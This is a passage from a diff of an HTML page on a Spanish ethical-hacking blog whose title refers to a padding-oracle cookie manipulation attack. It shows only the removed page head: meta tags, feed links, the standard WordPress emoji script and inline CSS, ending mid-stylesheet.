@@ -1,382 +1,395 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-	<meta charset="UTF-8">
-	<meta name="viewport" content="width=device-width, initial-scale=1">
-<meta name="robots" content="max-image-preview:large">
-<title>Manipulación de Cookie (ataque de Padding Oracle) &#8211; Hacking Usef</title>
-<link rel="alternate" type="application/rss+xml" title="Hacking Usef &raquo; Feed" href="https://usefdoybenz.github.io/ethicalhacking/feed/">
-<link rel="alternate" type="application/rss+xml" title="Hacking Usef &raquo; Feed de los comentarios" href="https://usefdoybenz.github.io/ethicalhacking/comments/feed/">
-<script>
-window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/usefdoybenz.github.io\/ethicalhacking\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.4.3"}};
-/*! This file is auto-generated */
-!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"🏳️‍⚧️","🏳️​⚧️")?!1:!n(e,"🇺🇳","🇺​🇳")&&!n(e,"🏴󠁧󠁢󠁥󠁮󠁧󠁿","🏴​󠁧​󠁢​󠁥​󠁮​󠁧​󠁿");case"emoji":return!n(e,"🫱🏻‍🫲🏿","🫱🏻​🫲🏿")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
-</script>
-<style id="wp-block-site-title-inline-css">.wp-block-site-title a{color:inherit}
-.wp-block-site-title{font-size: clamp(27.894px, 1.743rem + ((1vw - 3.2px) * 3.142), 48px);font-weight: 900;letter-spacing: -0.02em;}
-.wp-block-site-title a:where(:not(.wp-element-button)){text-decoration: none;}
-.wp-block-site-title a:where(:not(.wp-element-button)):hover{text-decoration: underline;}
-.wp-block-site-title a:where(:not(.wp-element-button)):focus{text-decoration: underline;}</style>
-<style id="wp-block-group-inline-css">.wp-block-group{box-sizing:border-box}</style>
-<style id="wp-block-query-title-inline-css">.wp-block-query-title{box-sizing:border-box}</style>
-<style id="wp-block-term-description-inline-css">:where(.wp-block-term-description){margin-bottom:var(--wp--style--block-gap);margin-top:var(--wp--style--block-gap)}.wp-block-term-description p{margin-bottom:0;margin-top:0}</style>
-<style id="wp-block-post-title-inline-css">.wp-block-post-title{box-sizing:border-box;word-break:break-word}.wp-block-post-title a{display:inline-block}
-.wp-block-post-title a:where(:not(.wp-element-button)){text-decoration: none;}
-.wp-block-post-title a:where(:not(.wp-element-button)):hover{text-decoration: underline;}
-.wp-block-post-title a:where(:not(.wp-element-button)):focus{text-decoration: underline;}</style>
-<style id="wp-block-post-featured-image-inline-css">.wp-block-post-featured-image{margin-left:0;margin-right:0}.wp-block-post-featured-image a{display:block;height:100%}.wp-block-post-featured-image img{box-sizing:border-box;height:auto;max-width:100%;vertical-align:bottom;width:100%}.wp-block-post-featured-image.alignfull img,.wp-block-post-featured-image.alignwide img{width:100%}.wp-block-post-featured-image .wp-block-post-featured-image__overlay.has-background-dim{background-color:#000;inset:0;position:absolute}.wp-block-post-featured-image{position:relative}.wp-block-post-featured-image .wp-block-post-featured-image__overlay.has-background-gradient{background-color:transparent}.wp-block-post-featured-image .wp-block-post-featured-image__overlay.has-background-dim-0{opacity:0}.wp-block-post-featured-image .wp-block-post-featured-image__overlay.has-background-dim-10{opacity:.1}.wp-block-post-featured-image .wp-block-post-featured-image__overlay.has-background-dim-20{opacity:.2}.wp-block-post-featured-image .wp-block-post-featured-image__overlay.has-background-dim-30{opacity:.3}.wp-block-post-featured-image .wp-block-post-featured-image__overlay.has-background-dim-40{opacity:.4}.wp-block-post-featured-image .wp-block-post-featured-image__overlay.has-background-dim-50{opacity:.5}.wp-block-post-featured-image .wp-block-post-featured-image__overlay.has-background-dim-60{opacity:.6}.wp-block-post-featured-image .wp-block-post-featured-image__overlay.has-background-dim-70{opacity:.7}.wp-block-post-featured-image .wp-block-post-featured-image__overlay.has-background-dim-80{opacity:.8}.wp-block-post-featured-image .wp-block-post-featured-image__overlay.has-background-dim-90{opacity:.9}.wp-block-post-featured-image .wp-block-post-featured-image__overlay.has-background-dim-100{opacity:1}.wp-block-post-featured-image:where(.alignleft,.alignright){width:100%}</style>
-<style id="wp-block-paragraph-inline-css">.is-small-text{font-size:.875em}.is-regular-text{font-size:1em}.is-large-text{font-size:2.25em}.is-larger-text{font-size:3em}.has-drop-cap:not(:focus):first-letter{float:left;font-size:8.4em;font-style:normal;font-weight:100;line-height:.68;margin:.05em .1em 0 0;text-transform:uppercase}body.rtl .has-drop-cap:not(:focus):first-letter{float:none;margin-left:.1em}p.has-drop-cap.has-background{overflow:hidden}p.has-background{padding:1.25em 2.375em}:where(p.has-text-color:not(.has-link-color)) a{color:inherit}p.has-text-align-left[style*="writing-mode:vertical-lr"],p.has-text-align-right[style*="writing-mode:vertical-rl"]{rotate:180deg}
-p{line-height: var(--wp--custom--typography--line-height--body);}</style>
-<style id="wp-block-image-inline-css">.wp-block-image img{box-sizing:border-box;height:auto;max-width:100%;vertical-align:bottom}.wp-block-image[style*=border-radius] img,.wp-block-image[style*=border-radius]>a{border-radius:inherit}.wp-block-image.has-custom-border img{box-sizing:border-box}.wp-block-image.aligncenter{text-align:center}.wp-block-image.alignfull img,.wp-block-image.alignwide img{height:auto;width:100%}.wp-block-image .aligncenter,.wp-block-image .alignleft,.wp-block-image .alignright,.wp-block-image.aligncenter,.wp-block-image.alignleft,.wp-block-image.alignright{display:table}.wp-block-image .aligncenter>figcaption,.wp-block-image .alignleft>figcaption,.wp-block-image .alignright>figcaption,.wp-block-image.aligncenter>figcaption,.wp-block-image.alignleft>figcaption,.wp-block-image.alignright>figcaption{caption-side:bottom;display:table-caption}.wp-block-image .alignleft{float:left;margin:.5em 1em .5em 0}.wp-block-image .alignright{float:right;margin:.5em 0 .5em 1em}.wp-block-image .aligncenter{margin-left:auto;margin-right:auto}.wp-block-image figcaption{margin-bottom:1em;margin-top:.5em}.wp-block-image .is-style-rounded img,.wp-block-image.is-style-circle-mask img,.wp-block-image.is-style-rounded img{border-radius:9999px}@supports ((-webkit-mask-image:none) or (mask-image:none)) or (-webkit-mask-image:none){.wp-block-image.is-style-circle-mask img{border-radius:0;-webkit-mask-image:url('data:image/svg+xml;utf8,<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg"><circle cx="50" cy="50" r="50"/></svg>');mask-image:url('data:image/svg+xml;utf8,<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg"><circle cx="50" cy="50" r="50"/></svg>');mask-mode:alpha;-webkit-mask-position:center;mask-position:center;-webkit-mask-repeat:no-repeat;mask-repeat:no-repeat;-webkit-mask-size:contain;mask-size:contain}}.wp-block-image :where(.has-border-color){border-style:solid}.wp-block-image :where([style*=border-top-color]){border-top-style:solid}.wp-block-image :where([style*=border-right-color]){border-right-style:solid}.wp-block-image :where([style*=border-bottom-color]){border-bottom-style:solid}.wp-block-image :where([style*=border-left-color]){border-left-style:solid}.wp-block-image :where([style*=border-width]){border-style:solid}.wp-block-image :where([style*=border-top-width]){border-top-style:solid}.wp-block-image :where([style*=border-right-width]){border-right-style:solid}.wp-block-image :where([style*=border-bottom-width]){border-bottom-style:solid}.wp-block-image :where([style*=border-left-width]){border-left-style:solid}.wp-block-image figure{margin:0}.wp-lightbox-container{display:flex;flex-direction:column;position:relative}.wp-lightbox-container img{cursor:zoom-in}.wp-lightbox-container img:hover+button{opacity:1}.wp-lightbox-container button{align-items:center;-webkit-backdrop-filter:blur(16px) saturate(180%);backdrop-filter:blur(16px) saturate(180%);background-color:rgba(90,90,90,.25);border:none;border-radius:4px;cursor:zoom-in;display:flex;height:20px;justify-content:center;opacity:0;padding:0;position:absolute;right:16px;text-align:center;top:16px;transition:opacity .2s ease;width:20px;z-index:100}.wp-lightbox-container button:focus-visible{outline:3px auto rgba(90,90,90,.25);outline:3px auto -webkit-focus-ring-color;outline-offset:3px}.wp-lightbox-container button:hover{cursor:pointer;opacity:1}.wp-lightbox-container button:focus{opacity:1}.wp-lightbox-container button:focus,.wp-lightbox-container button:hover,.wp-lightbox-container button:not(:hover):not(:active):not(.has-background){background-color:rgba(90,90,90,.25);border:none}.wp-lightbox-overlay{box-sizing:border-box;cursor:zoom-out;height:100vh;left:0;overflow:hidden;position:fixed;top:0;visibility:hidden;width:100vw;z-index:100000}.wp-lightbox-overlay .close-button{align-items:center;cursor:pointer;display:flex;justify-content:center;min-height:40px;min-width:40px;padding:0;position:absolute;right:calc(env(safe-area-inset-right) + 16px);top:calc(env(safe-area-inset-top) + 16px);z-index:5000000}.wp-lightbox-overlay .close-button:focus,.wp-lightbox-overlay .close-button:hover,.wp-lightbox-overlay .close-button:not(:hover):not(:active):not(.has-background){background:none;border:none}.wp-lightbox-overlay .lightbox-image-container{height:var(--wp--lightbox-container-height);left:50%;overflow:hidden;position:absolute;top:50%;transform:translate(-50%,-50%);transform-origin:top left;width:var(--wp--lightbox-container-width);z-index:9999999999}.wp-lightbox-overlay .wp-block-image{align-items:center;box-sizing:border-box;display:flex;height:100%;justify-content:center;margin:0;position:relative;transform-origin:0 0;width:100%;z-index:3000000}.wp-lightbox-overlay .wp-block-image img{height:var(--wp--lightbox-image-height);min-height:var(--wp--lightbox-image-height);min-width:var(--wp--lightbox-image-width);width:var(--wp--lightbox-image-width)}.wp-lightbox-overlay .wp-block-image figcaption{display:none}.wp-lightbox-overlay button{background:none;border:none}.wp-lightbox-overlay .scrim{background-color:#fff;height:100%;opacity:.9;position:absolute;width:100%;z-index:2000000}.wp-lightbox-overlay.active{animation:turn-on-visibility .25s both;visibility:visible}.wp-lightbox-overlay.active img{animation:turn-on-visibility .35s both}.wp-lightbox-overlay.hideanimationenabled:not(.active){animation:turn-off-visibility .35s both}.wp-lightbox-overlay.hideanimationenabled:not(.active) img{animation:turn-off-visibility .25s both}@media (prefers-reduced-motion:no-preference){.wp-lightbox-overlay.zoom.active{animation:none;opacity:1;visibility:visible}.wp-lightbox-overlay.zoom.active .lightbox-image-container{animation:lightbox-zoom-in .4s}.wp-lightbox-overlay.zoom.active .lightbox-image-container img{animation:none}.wp-lightbox-overlay.zoom.active .scrim{animation:turn-on-visibility .4s forwards}.wp-lightbox-overlay.zoom.hideanimationenabled:not(.active){animation:none}.wp-lightbox-overlay.zoom.hideanimationenabled:not(.active) .lightbox-image-container{animation:lightbox-zoom-out .4s}.wp-lightbox-overlay.zoom.hideanimationenabled:not(.active) .lightbox-image-container img{animation:none}.wp-lightbox-overlay.zoom.hideanimationenabled:not(.active) .scrim{animation:turn-off-visibility .4s forwards}}@keyframes turn-on-visibility{0%{opacity:0}to{opacity:1}}@keyframes turn-off-visibility{0%{opacity:1;visibility:visible}99%{opacity:0;visibility:visible}to{opacity:0;visibility:hidden}}@keyframes lightbox-zoom-in{0%{transform:translate(calc(-50vw + var(--wp--lightbox-initial-left-position)),calc(-50vh + var(--wp--lightbox-initial-top-position))) scale(var(--wp--lightbox-scale))}to{transform:translate(-50%,-50%) scale(1)}}@keyframes lightbox-zoom-out{0%{transform:translate(-50%,-50%) scale(1);visibility:visible}99%{visibility:visible}to{transform:translate(calc(-50vw + var(--wp--lightbox-initial-left-position)),calc(-50vh + var(--wp--lightbox-initial-top-position))) scale(var(--wp--lightbox-scale));visibility:hidden}}</style>
-<style id="wp-block-separator-inline-css">@charset "UTF-8";.wp-block-separator{border:1px solid;border-left:none;border-right:none}.wp-block-separator.is-style-dots{background:none!important;border:none;height:auto;line-height:1;text-align:center}.wp-block-separator.is-style-dots:before{color:currentColor;content:"···";font-family:serif;font-size:1.5em;letter-spacing:2em;padding-left:2em}</style>
-<style id="wp-block-post-template-inline-css">.wp-block-post-template{list-style:none;margin-bottom:0;margin-top:0;max-width:100%;padding:0}.wp-block-post-template.wp-block-post-template{background:none}.wp-block-post-template.is-flex-container{display:flex;flex-direction:row;flex-wrap:wrap;gap:1.25em}.wp-block-post-template.is-flex-container>li{margin:0;width:100%}@media (min-width:600px){.wp-block-post-template.is-flex-container.is-flex-container.columns-2>li{width:calc(50% - .625em)}.wp-block-post-template.is-flex-container.is-flex-container.columns-3>li{width:calc(33.33333% - .83333em)}.wp-block-post-template.is-flex-container.is-flex-container.columns-4>li{width:calc(25% - .9375em)}.wp-block-post-template.is-flex-container.is-flex-container.columns-5>li{width:calc(20% - 1em)}.wp-block-post-template.is-flex-container.is-flex-container.columns-6>li{width:calc(16.66667% - 1.04167em)}}@media (max-width:600px){.wp-block-post-template-is-layout-grid.wp-block-post-template-is-layout-grid.wp-block-post-template-is-layout-grid.wp-block-post-template-is-layout-grid{grid-template-columns:1fr}}.wp-block-post-template-is-layout-constrained>li>.alignright,.wp-block-post-template-is-layout-flow>li>.alignright{-webkit-margin-start:2em;-webkit-margin-end:0;float:right;margin-inline-end:0;margin-inline-start:2em}.wp-block-post-template-is-layout-constrained>li>.alignleft,.wp-block-post-template-is-layout-flow>li>.alignleft{-webkit-margin-start:0;-webkit-margin-end:2em;float:left;margin-inline-end:2em;margin-inline-start:0}.wp-block-post-template-is-layout-constrained>li>.aligncenter,.wp-block-post-template-is-layout-flow>li>.aligncenter{-webkit-margin-start:auto;-webkit-margin-end:auto;margin-inline-end:auto;margin-inline-start:auto}
-.wp-block-post-template-is-layout-flow > :first-child:first-child{margin-block-start: 0;}.wp-block-post-template-is-layout-flow > :last-child:last-child{margin-block-end: 0;}.wp-block-post-template-is-layout-flow > *{margin-block-start: 0;margin-block-end: 0;}.wp-block-post-template-is-layout-constrained > :first-child:first-child{margin-block-start: 0;}.wp-block-post-template-is-layout-constrained > :last-child:last-child{margin-block-end: 0;}.wp-block-post-template-is-layout-constrained > *{margin-block-start: 0;margin-block-end: 0;}.wp-block-post-template-is-layout-flex{gap: 0;}.wp-block-post-template-is-layout-grid{gap: 0;}</style>
-<style id="wp-block-query-pagination-inline-css">.wp-block-query-pagination>.wp-block-query-pagination-next,.wp-block-query-pagination>.wp-block-query-pagination-numbers,.wp-block-query-pagination>.wp-block-query-pagination-previous{margin-bottom:.5em;margin-right:.5em}.wp-block-query-pagination>.wp-block-query-pagination-next:last-child,.wp-block-query-pagination>.wp-block-query-pagination-numbers:last-child,.wp-block-query-pagination>.wp-block-query-pagination-previous:last-child{margin-right:0}.wp-block-query-pagination.is-content-justification-space-between>.wp-block-query-pagination-next:last-of-type{-webkit-margin-start:auto;margin-inline-start:auto}.wp-block-query-pagination.is-content-justification-space-between>.wp-block-query-pagination-previous:first-child{-webkit-margin-end:auto;margin-inline-end:auto}.wp-block-query-pagination .wp-block-query-pagination-previous-arrow{display:inline-block;margin-right:1ch}.wp-block-query-pagination .wp-block-query-pagination-previous-arrow:not(.is-arrow-chevron){transform:scaleX(1)}.wp-block-query-pagination .wp-block-query-pagination-next-arrow{display:inline-block;margin-left:1ch}.wp-block-query-pagination .wp-block-query-pagination-next-arrow:not(.is-arrow-chevron){transform:scaleX(1)}.wp-block-query-pagination.aligncenter{justify-content:center}</style>
-<style id="wp-emoji-styles-inline-css">img.wp-smiley, img.emoji {
-		display: inline !important;
-		border: none !important;
-		box-shadow: none !important;
-		height: 1em !important;
-		width: 1em !important;
-		margin: 0 0.07em !important;
-		vertical-align: -0.1em !important;
-		background: none !important;
-		padding: 0 !important;
-	}</style>
-<style id="wp-block-library-inline-css">:root{--wp-admin-theme-color:#007cba;--wp-admin-theme-color--rgb:0,124,186;--wp-admin-theme-color-darker-10:#006ba1;--wp-admin-theme-color-darker-10--rgb:0,107,161;--wp-admin-theme-color-darker-20:#005a87;--wp-admin-theme-color-darker-20--rgb:0,90,135;--wp-admin-border-width-focus:2px;--wp-block-synced-color:#7a00df;--wp-block-synced-color--rgb:122,0,223}@media (min-resolution:192dpi){:root{--wp-admin-border-width-focus:1.5px}}.wp-element-button{cursor:pointer}:root{--wp--preset--font-size--normal:16px;--wp--preset--font-size--huge:42px}:root .has-very-light-gray-background-color{background-color:#eee}:root .has-very-dark-gray-background-color{background-color:#313131}:root .has-very-light-gray-color{color:#eee}:root .has-very-dark-gray-color{color:#313131}:root .has-vivid-green-cyan-to-vivid-cyan-blue-gradient-background{background:linear-gradient(135deg,#00d084,#0693e3)}:root .has-purple-crush-gradient-background{background:linear-gradient(135deg,#34e2e4,#4721fb 50%,#ab1dfe)}:root .has-hazy-dawn-gradient-background{background:linear-gradient(135deg,#faaca8,#dad0ec)}:root .has-subdued-olive-gradient-background{background:linear-gradient(135deg,#fafae1,#67a671)}:root .has-atomic-cream-gradient-background{background:linear-gradient(135deg,#fdd79a,#004a59)}:root .has-nightshade-gradient-background{background:linear-gradient(135deg,#330968,#31cdcf)}:root .has-midnight-gradient-background{background:linear-gradient(135deg,#020381,#2874fc)}.has-regular-font-size{font-size:1em}.has-larger-font-size{font-size:2.625em}.has-normal-font-size{font-size:var(--wp--preset--font-size--normal)}.has-huge-font-size{font-size:var(--wp--preset--font-size--huge)}.has-text-align-center{text-align:center}.has-text-align-left{text-align:left}.has-text-align-right{text-align:right}#end-resizable-editor-section{display:none}.aligncenter{clear:both}.items-justified-left{justify-content:flex-start}.items-justified-center{justify-content:center}.items-justified-right{justify-content:flex-end}.items-justified-space-between{justify-content:space-between}.screen-reader-text{clip:rect(1px,1px,1px,1px);word-wrap:normal!important;border:0;-webkit-clip-path:inset(50%);clip-path:inset(50%);height:1px;margin:-1px;overflow:hidden;padding:0;position:absolute;width:1px}.screen-reader-text:focus{clip:auto!important;background-color:#ddd;-webkit-clip-path:none;clip-path:none;color:#444;display:block;font-size:1em;height:auto;left:5px;line-height:normal;padding:15px 23px 14px;text-decoration:none;top:5px;width:auto;z-index:100000}html :where(.has-border-color){border-style:solid}html :where([style*=border-top-color]){border-top-style:solid}html :where([style*=border-right-color]){border-right-style:solid}html :where([style*=border-bottom-color]){border-bottom-style:solid}html :where([style*=border-left-color]){border-left-style:solid}html :where([style*=border-width]){border-style:solid}html :where([style*=border-top-width]){border-top-style:solid}html :where([style*=border-right-width]){border-right-style:solid}html :where([style*=border-bottom-width]){border-bottom-style:solid}html :where([style*=border-left-width]){border-left-style:solid}html :where(img[class*=wp-image-]){height:auto;max-width:100%}:where(figure){margin:0 0 1em}html :where(.is-position-sticky){--wp-admin--admin-bar--position-offset:var(--wp-admin--admin-bar--height,0px)}@media screen and (max-width:600px){html :where(.is-position-sticky){--wp-admin--admin-bar--position-offset:0px}}</style>
-<style id="global-styles-inline-css">body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--color--foreground: #fff;--wp--preset--color--background: #182848;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: clamp(14px, 0.875rem + ((1vw - 3.2px) * 0.313), 16px);--wp--preset--font-size--medium: clamp(16px, 1rem + ((1vw - 3.2px) * 0.313), 18px);--wp--preset--font-size--large: clamp(18px, 1.125rem + ((1vw - 3.2px) * 0.469), 21px);--wp--preset--font-size--x-large: clamp(25.014px, 1.563rem + ((1vw - 3.2px) * 2.654), 42px);--wp--preset--font-size--tiny: clamp(12px, 0.75rem + ((1vw - 3.2px) * 0.313), 14px);--wp--preset--font-size--extra-large: clamp(21px, 1.313rem + ((1vw - 3.2px) * 0.469), 24px);--wp--preset--font-size--huge: clamp(24px, 1.5rem + ((1vw - 3.2px) * 1.25), 32px);--wp--preset--font-size--heading-1: clamp(40px, 2.5rem + ((1vw - 3.2px) * 1.25), 48px);--wp--preset--font-size--heading-2: clamp(32px, 2rem + ((1vw - 3.2px) * 1.25), 40px);--wp--preset--font-size--heading-3: clamp(24px, 1.5rem + ((1vw - 3.2px) * 1.25), 32px);--wp--preset--font-size--heading-4: clamp(21px, 1.313rem + ((1vw - 3.2px) * 0.469), 24px);--wp--preset--font-size--heading-5: clamp(18px, 1.125rem + ((1vw - 3.2px) * 0.469), 21px);--wp--preset--font-size--heading-6: clamp(16px, 1rem + ((1vw - 3.2px) * 0.313), 18px);--wp--preset--font-family--bitter: "Bitter", ui-serif, Georgia, serif;--wp--preset--font-family--dancing-script: "Dancing Script", ui-monospace, Menlo, Consolas, Monaco, "Liberation Mono", "Lucida Console", monospace;--wp--preset--font-family--edu-qld-beginner: "Edu QLD Beginner", ui-monospace, Menlo, Consolas, Monaco, "Liberation Mono", "Lucida Console", monospace;--wp--preset--font-family--figtree: Figtree, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif;--wp--preset--font-family--inter: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif;--wp--preset--font-family--libre-bodoni: "Libre Bodoni", ui-serif, Georgia, serif;--wp--preset--font-family--lora: "Lora", ui-serif, Georgia, serif;--wp--preset--font-family--recursive: "Recursive", ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif;--wp--preset--font-family--red-hat-mono: "Red Hat Mono", ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif;--wp--preset--font-family--red-hat-text: "Red Hat Text", ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif;--wp--preset--font-family--space-grotesk: "Space Grotesk", ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif;--wp--preset--font-family--system-sans-serif: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif;--wp--preset--font-family--system-serif: ui-serif, Georgia, serif;--wp--preset--font-family--system-monospace: ui-monospace, Menlo, Consolas, Monaco, "Liberation Mono", "Lucida Console", monospace;--wp--preset--spacing--10: 8px;--wp--preset--spacing--20: 12px;--wp--preset--spacing--30: 16px;--wp--preset--spacing--40: 24px;--wp--preset--spacing--50: 32px;--wp--preset--spacing--60: clamp(36px, 7.5vw, 40px);--wp--preset--spacing--70: clamp(42px, 9vw, 48px);--wp--preset--spacing--80: clamp(48px, 10.5vw, 56px);--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);--wp--custom--typography--line-height--body: 1.5em;--wp--custom--typography--line-height--headings: 1.25;}body { margin: 0;--wp--style--global--content-size: 480px;--wp--style--global--wide-size: 960px; }.wp-site-blocks { padding-top: var(--wp--style--root--padding-top); padding-bottom: var(--wp--style--root--padding-bottom); }.has-global-padding { padding-right: var(--wp--style--root--padding-right); padding-left: var(--wp--style--root--padding-left); }.has-global-padding :where(.has-global-padding:not(.wp-block-block)) { padding-right: 0; padding-left: 0; }.has-global-padding > .alignfull { margin-right: calc(var(--wp--style--root--padding-right) * -1); margin-left: calc(var(--wp--style--root--padding-left) * -1); }.has-global-padding :where(.has-global-padding:not(.wp-block-block)) > .alignfull { margin-right: 0; margin-left: 0; }.has-global-padding > .alignfull:where(:not(.has-global-padding):not(.is-layout-flex):not(.is-layout-grid)) > :where([class*="wp-block-"]:not(.alignfull):not([class*="__"]),p,h1,h2,h3,h4,h5,h6,ul,ol) { padding-right: var(--wp--style--root--padding-right); padding-left: var(--wp--style--root--padding-left); }.has-global-padding :where(.has-global-padding) > .alignfull:where(:not(.has-global-padding)) > :where([class*="wp-block-"]:not(.alignfull):not([class*="__"]),p,h1,h2,h3,h4,h5,h6,ul,ol) { padding-right: 0; padding-left: 0; }.wp-site-blocks > .alignleft { float: left; margin-right: 2em; }.wp-site-blocks > .alignright { float: right; margin-left: 2em; }.wp-site-blocks > .aligncenter { justify-content: center; margin-left: auto; margin-right: auto; }:where(.wp-site-blocks) > * { margin-block-start: 1.6rem; margin-block-end: 0; }:where(.wp-site-blocks) > :first-child:first-child { margin-block-start: 0; }:where(.wp-site-blocks) > :last-child:last-child { margin-block-end: 0; }body { --wp--style--block-gap: 1.6rem; }:where(body .is-layout-flow)  > :first-child:first-child{margin-block-start: 0;}:where(body .is-layout-flow)  > :last-child:last-child{margin-block-end: 0;}:where(body .is-layout-flow)  > *{margin-block-start: 1.6rem;margin-block-end: 0;}:where(body .is-layout-constrained)  > :first-child:first-child{margin-block-start: 0;}:where(body .is-layout-constrained)  > :last-child:last-child{margin-block-end: 0;}:where(body .is-layout-constrained)  > *{margin-block-start: 1.6rem;margin-block-end: 0;}:where(body .is-layout-flex) {gap: 1.6rem;}:where(body .is-layout-grid) {gap: 1.6rem;}body .is-layout-flow > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-flow > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-flow > .aligncenter{margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-constrained > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-constrained > .aligncenter{margin-left: 